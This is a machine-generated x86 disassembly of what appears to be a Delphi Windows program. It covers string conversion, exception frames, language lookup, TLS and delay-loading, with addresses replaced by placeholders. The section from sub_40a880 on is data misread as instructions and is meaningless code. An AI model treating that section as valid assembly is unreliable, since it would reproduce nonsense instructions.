mov [ ebp - 0x224 ] ebx
mov [ ebp - 0x220 ] ebx
mov esi ecx
mov [ ebp - 0x21c ] edx
mov [ ebp - 0x218 ] eax
mov eax [ ebp - 0x218 ]
call j_sub_406bfc
mov eax [ ebp - 0x21c ]
call j_sub_406bfc
lea edi [ ebp - 0x210 ]
xor eax eax
push ebp
push sub_409aff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
xor edx edx
call sub_4070a8
xor ebx ebx
push 0x105
mov eax [ ebp - 0x21c ]
call sub_407134
push eax
lea eax [ ebp - 0x20a ]
push eax
call lstrcpynW
lea eax [ ebp - 0x20a ]
push eax
call lstrlenW
add eax eax
lea edx [ ebp - 0x20a ]
add eax edx
sub eax 0x2
mov [ edi ] eax
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x2e
je r-xdata
lea eax [ ebp - 0x20a ]
cmp eax [ edi ]
je r-xdata
lea eax [ ebp - 0x20a ]
cmp eax [ edi ]
jne r-xdata
test bl bl
je r-xdata
add [ edi ] 0x2
mov eax [ edi ]
mov [ eax ] 0x0
lea eax [ ebp - 0x20a ]
mov edx [ edi ]
sub edx eax
sar edx 0x1
jns r-xdata
sub [ edi ] 0x2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409b06
lea eax [ ebp - 0x228 ]
mov edx 0x5
call j_sub_4068c4
retn
mov eax esi
lea edx [ ebp - 0x20a ]
mov ecx 0x105
call sub_407290
mov eax 0x105
sub eax edx
mov [ ebp - 0x214 ] eax
lea edx [ ebp - 0x220 ]
mov eax [ ebp - 0x218 ]
call sub_4094b0
cmp [ ebp - 0x220 ] 0x0
je r-xdata
adc edx 0x0
push ebp
call GetUserDefaultUILanguage
lea edx [ ebp - 0x224 ]
call sub_40908c
mov eax [ ebp - 0x224 ]
call sub_409854
pop ecx
mov ebx eax
test bl bl
jne r-xdata
push ebp
mov eax [ ebp - 0x220 ]
call sub_409854
pop ecx
mov ebx eax
jmp r-xdata
test bl bl
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push ebp
call sub_409904
pop ecx
mov ebx eax
push ebp
call GetSystemDefaultUILanguage
lea edx [ ebp - 0x228 ]
call sub_40908c
mov eax [ ebp - 0x228 ]
call sub_409854
pop ecx
mov ebx eax
sub_409b18
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4089c8
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_409b74
push ebx
push esi
push edi
push ebp
mov ebp eax
mov edi [ rw-data ]
test edi edi
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ ebx ]
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax edi
call sub_404220
jmp r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebp
jne r-xdata
mov edi esi
mov eax [ esi ]
mov [ ebx ] eax
mov edx 0x8
mov eax edi
call sub_404220
jmp r-xdata
sub_409bd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_409c13
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_409c44
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_409ca8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_409bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409caf
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_409ccc
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_409cf8
test edx edx
je sub_409cb4
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_404360
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_409d60
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4056b8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_409d9c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
call sub_402404
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_409dc4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
test ebx ebx
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
push 0xfde9
call sub_402570
push 0x0
push 0x0
push edi
push ebx
mov eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
push 0xfde9
call sub_402570
test eax eax
jbe r-xdata
cmp edi eax
jb r-xdata
cmp [ ebx + eax - 0x1 ] 0x0
je r-xdata
cmp edi eax
jne r-xdata
inc eax
jmp r-xdata
cmp eax 0x1
jbe r-xdata
mov [ ebx + eax - 0x1 ] 0x0
jmp r-xdata
cmp [ ebx + eax - 0x1 ] 0x7f
jbe r-xdata
test [ ebx + eax - 0x1 ] 0x80
je r-xdata
movzx edx [ ebx + eax - 0x1 ]
and dl 0xc0
cmp dl 0xc0
jne r-xdata
dec eax
jmp r-xdata
sub_409e54
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
push edi
push 0x0
push 0xfde9
call sub_402550
test esi esi
jbe r-xdata
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
push edi
push 0x0
push 0xfde9
call sub_402550
test eax eax
jbe r-xdata
cmp esi eax
jb r-xdata
cmp [ ebx + eax * 2 - 0x2 ] 0x0
je r-xdata
cmp esi eax
jne r-xdata
inc eax
cmp eax 0x1
jbe r-xdata
mov [ ebx + eax * 2 - 0x2 ] 0x0
jmp r-xdata
cmp [ ebx + eax * 2 - 0x2 ] 0xdc00
jb r-xdata
cmp [ ebx + eax * 2 - 0x2 ] 0xdfff
ja r-xdata
dec eax
jmp r-xdata
sub_409ed8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_409fe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4068a0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409fef
lea eax [ ebp - 0x8 ]
call sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
lea edx [ ebx + ebx * 2 ]
lea eax [ ebp - 0x8 ]
mov ecx 0xfde9
call sub_406c8c
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ ebp - 0x8 ]
call sub_406c0c
lea edx [ edi + 0x1 ]
pop ecx
call sub_409dc4
mov ebx eax
test ebx ebx
jle r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x8 ]
mov cx 0xfde9
mov edx [ ebp - 0x8 ]
call sub_406a80
lea eax [ ebp - 0x8 ]
call sub_4068a0
mov edx ebx
dec edx
lea eax [ ebp - 0x8 ]
mov ecx 0xfde9
call sub_406c8c
jmp r-xdata
mov eax [ esi ]
sub eax 0xc
mov [ eax ] 0xfde9
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4068f4
cmp [ esi ] 0x0
je r-xdata
sub_409ff8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_40a078
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
call sub_407134
mov ecx eax
lea eax [ esi + 0x1 ]
mov edx 0xff
call sub_409dc4
dec eax
test eax eax
jge r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov [ esi ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a07f
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
xor eax eax
sub_40a084
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_406bfc
xor eax eax
push ebp
push sub_40a14f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
xor edx edx
call sub_4070a8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a156
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40740c
push ebx
mov eax [ ebp - 0x4 ]
call sub_406c0c
push eax
mov eax [ ebp - 0x8 ]
call sub_407134
lea edx [ ebx + 0x1 ]
pop ecx
call sub_409e54
mov ebx eax
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_406a80
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4070fc
mov edx ebx
dec edx
lea eax [ ebp - 0x8 ]
call sub_40740c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4070a8
sub_40a15c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40a1e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
xor edx edx
call sub_4070a8
cmp [ esi ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a1e9
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
movzx ebx [ esi ]
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40740c
push ebx
mov eax [ ebp - 0x4 ]
call sub_407134
lea ecx [ esi + 0x1 ]
lea edx [ ebx + 0x1 ]
call sub_409e54
mov ebx eax
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4070fc
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_40740c
jmp r-xdata
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_4070a8
sub_40a204
push ebx
push esi
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ esp + 0x2000 ]
add esp 0x4
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x2000
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_407254
push 0x1000
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_408a10
push eax
call sub_402538
mov ecx eax
mov edx esp
mov eax esi
call sub_4071e4
jmp r-xdata
sub_40a28c
call sub_4025a0
mov edx eax
and edx 0xff
and eax 0xff00
shr eax 0x8
cmp edx 0x5
jne r-xdata
cmp edx 0x5
jbe r-xdata
cmp eax 0x1
jae r-xdata
mov [ rw-data ] 0x409
retn
mov [ rw-data ] 0x7f
retn
sub_40a318
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push 0x8
push 0x40
call sub_40a2c8
mov ebx eax
test ebx ebx
jne r-xdata
mov [ ebx + 0x4 ] esi
mov eax [ rw-data ]
mov [ ebx ] eax
mov [ rw-data ] ebx
pop esi
pop ebx
pop ebp
retn
push esi
push 0x1
push 0x0
push 0xc0fb0008
call sub_402458
sub_40a352
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax rw-data
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp edx [ eax ]
jne r-xdata
cmp edx [ eax ]
jne r-xdata
push edx
call LocalFree
pop ebp
retn
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ eax ]
sub_40a3b3
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_40a38f
pop ecx
shl eax 0x2
push eax
push [ ebp + 0xc ]
push ebx
call sub_40a2e8
add esp 0xc
pop ebx
pop ebp
retn 0x8
sub_40a3fe
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
push 0x24
push 0x0
lea eax [ ebp - 0x30 ]
push eax
call sub_40a2fc
add esp 0xc
mov [ ebp - 0x30 ] 0x24
mov [ ebp - 0x2c ] esi
mov edx [ ebp + 0xc ]
mov [ ebp - 0x28 ] edx
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x24 ] ecx
mov ebx esi
mov ebx [ ebx + 0x8 ]
push [ esi + 0xc ]
push [ ebp + 0xc ]
call sub_40a37a
add esp 0x8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shl eax 0x2
add eax [ esi + 0x10 ]
test [ eax + 0x3 ] 0x80
sete dl
and edx 0x1
mov [ ebp - 0x20 ] edx
test edx edx
je r-xdata
mov ecx [ eax ]
and ecx 0xffff
mov [ ebp - 0x1c ] ecx
mov eax [ eax ]
add eax 0x2
mov [ ebp - 0x1c ] eax
jmp r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0x0
call [ rw-data ]
mov edi eax
test eax eax
je r-xdata
xor edi edi
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x18 ] ebx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
jmp r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0x2
call [ rw-data ]
mov edi eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
push edx
push 0x1
call [ rw-data ]
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
test edi edi
jne r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
push [ ebp - 0x24 ]
call LoadLibraryA
mov ebx eax
mov eax edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edi
lea ecx [ ebp - 0x30 ]
push ecx
push 0x5
call [ rw-data ]
mov eax [ ebp + 0xc ]
mov [ eax ] edi
call sub_4024e8
mov [ ebp - 0x10 ] eax
cmp [ rw-data ] 0x0
je r-xdata
push [ ebp - 0x1c ]
push ebx
call sub_402510
mov edi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
push rw-data
call sub_402428
cmp [ esi + 0x8 ] 0x0
jne r-xdata
call sub_4024e8
mov [ ebp - 0x10 ] eax
cmp [ rw-data ] 0x0
je r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0x4
call [ rw-data ]
mov edi eax
push ebx
call sub_40a3a6
mov edi eax
cmp [ edi ] 0x4550
jne r-xdata
push ebx
call sub_4024d8
mov ebx esi
mov ebx [ ebx + 0x8 ]
push esi
call sub_40a318
pop ecx
mov [ esi + 0x8 ] ebx
jmp r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0x3
call [ rw-data ]
mov ebx eax
lea eax [ ebp - 0x30 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
push edx
push 0x1
push 0x0
push 0xc0fb007f
call sub_402458
mov edi [ ebp - 0x14 ]
push edi
call sub_40a3d6
cmp eax [ esi + 0x1c ]
jne r-xdata
push rw-data
call sub_402430
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
push edx
push 0x1
push 0x0
push 0xc0fb007e
call sub_402458
mov eax [ ebp - 0x14 ]
jmp r-xdata
push ebx
push edi
call sub_40a3e3
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ esi + 0x14 ]
push [ esi + 0xc ]
call sub_40a3b3
mov eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov edi [ eax + edx * 4 ]
jmp r-xdata
sub_40a61f
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
xor eax eax
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov esi ebx
mov esi [ esi + 0x4 ]
mov edi esi
mov edi [ edi + 0x8 ]
push [ esi + 0x18 ]
push [ esi + 0xc ]
call sub_40a3b3
push edi
call sub_4024d8
xor eax eax
mov [ esi + 0x8 ] eax
push ebx
call sub_40a352
pop ecx
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a66a
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx rw-data
push rw-data
call sub_402428
test esi esi
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
push [ ebx ]
call sub_40a61f
pop ecx
mov ebx 0x1
push ebx
call sub_40a61f
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x4 ]
push esi
call lstrcmpiA
test eax eax
jne r-xdata
push rw-data
call sub_402430
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
jmp r-xdata
sub_40a6fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40a764
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a76b
retn
mov eax rw-data
call sub_404a78
mov eax rw-data
call sub_404a78
mov eax rw-data
call sub_404a78
call sub_408d58
call sub_404198
call sub_40a6e3
mov eax rw-data
call sub_4068a0
mov eax rw-data
call sub_4068a0
sub_40a7a4
push ebx
call sub_40a79c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_40a790
test eax eax
jne r-xdata
mov eax 0xe2
call sub_4067e0
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_4067e0
sub_40a7e8
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_40a7a4
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_40a834
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_40a770
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
lea eax [ ebx + 0x8 ]
mov [ rw-data ] eax
call sub_40a828
mov edx rw-data
mov eax ebx
call sub_406418
pop ebx
retn
sub_40a880
test [ eax + 0x60e0040 ] ch
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x8
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add al [ ecx ]
pop eax
add al [ eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ ecx ]
pop ecx
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
mov esp 0x140040a8
add eax 0x63655250
je r-xdata
test al 0x40
add [ edx ] al
add [ ebp - 0x572fffc0 ] cl
inc eax
add [ esi ] cl
add eax 0x63655254
je r-xdata
add [ eax ] al
add [ eax ] al
add al [ esp + ecx * 2 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + edx + 0x40 ] bl
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ ebx ]
push esp
outsd
jo r-xdata
add [ eax + edx + 0x40040 ] bl
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ 0x68676952 ]
je r-xdata
add [ eax + edx + 0x80040 ] bl
adc [ eax ] al
or al 0x0
add [ eax ] al
add al [ esi ]
inc edx
outsd
je r-xdata
add [ eax + edx + 0xc0040 ] bl
insb
insb
push eax
outsd
imul ebp [ esi + 0x74 ] 0x4
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x4010 ] al
add [ eax ] al
add [ edx ] al
add [ eax + 0x2 ] edi
add [ eax + 0x2004010 ] al
add [ eax ] al
add [ edx ] al
add [ ecx + 0x2 ] edi
outsd
insd
add al [ eax ]
sub [ eax + 0x40 ] 0x0
add [ edx ] al
pop es
push esp
outsd
jo r-xdata
add ebx [ ebp - 0x10 ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
je r-xdata
add al 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x8 ]
sub edx ebx
mov [ eax ] edx
jmp r-xdata
dec dl
je r-xdata
test al 0x40
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or eax [ edx + 0x6f ]
je r-xdata
add [ eax + 0x80040a8 ] al
add ebx [ ebp - 0xc ]
mov [ eax + 0xc ] ebx
jmp r-xdata
dec dl
je r-xdata
add al [ eax ]
outsd
insd
push edx
imul esp [ edi + 0x68 ] 0x2000274
add [ ebx + 0x40a958c0 ] cl
add [ esi ] cl
pop es
je r-xdata
mov edx [ ebp - 0x4 ]
sub edx ebx
mov [ eax + 0x4 ] edx
jmp r-xdata
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov eax [ ebp + 0x8 ]
mov edi eax
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub dl 0x1
jb r-xdata
add [ edx ] al
add [ eax ] al
add al [ ecx ]
jns r-xdata
add [ eax ] al
add al [ edx ]
arpl [ ecx + 0x2 ] di
add [ edx ] al
add [ eax + 0xe0040a9 ] dl
or edx [ ebx + edx * 2 + 0x6d ]
popad
push ebx
dec ecx
pop edx
inc ebp
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add al [ edx ]
arpl [ eax + 0x2 ] di
add [ eax + edx + 0x40040 ] bl
sub_40a9c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov eax [ ebp + 0x8 ]
mov edi eax
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub dl 0x1
jb r-xdata
add ebx [ ebp - 0x10 ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x8 ]
sub edx ebx
mov [ eax ] edx
jmp r-xdata
dec dl
je r-xdata
add ebx [ ebp - 0xc ]
mov [ eax + 0xc ] ebx
jmp r-xdata
dec dl
je r-xdata
mov edx [ ebp - 0x4 ]
sub edx ebx
mov [ eax + 0x4 ] edx
jmp r-xdata
sub_40aa24
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov edi ebx
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub dl 0x1
jb r-xdata
lea eax [ ebp - 0x10 ]
call sub_40abac
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp + 0x8 ]
call sub_404644
add eax [ ebp - 0x10 ]
mov [ ebx + 0x8 ] eax
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
call sub_40abac
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp + 0x8 ]
call sub_404644
mov edx [ ebp - 0x8 ]
sub edx eax
mov [ ebx ] edx
jmp r-xdata
dec dl
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_40abb4
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp + 0x8 ]
call sub_404644
add eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
dec dl
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_40abb4
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp + 0x8 ]
call sub_404644
mov edx [ ebp - 0x4 ]
sub edx eax
mov [ ebx + 0x4 ] edx
jmp r-xdata
sub_40aad4
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov esi edx
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] ecx
lea eax [ esp + 0x14 ]
call sub_40abac
mov ebx eax
lea eax [ esp + 0x14 ]
call sub_40abb4
mov esi eax
mov edi [ esp + 0xc ]
add edi [ esp + 0x4 ]
sar edi 0x1
jns r-xdata
mov ebp [ esp + 0x8 ]
add ebp [ esp + 0x10 ]
sar ebp 0x1
jns r-xdata
adc edi 0x0
lea eax [ esi + 0x1 ]
sar eax 0x1
jns r-xdata
adc ebp 0x0
add eax ebp
push eax
mov eax [ esp + 0x4 ]
push eax
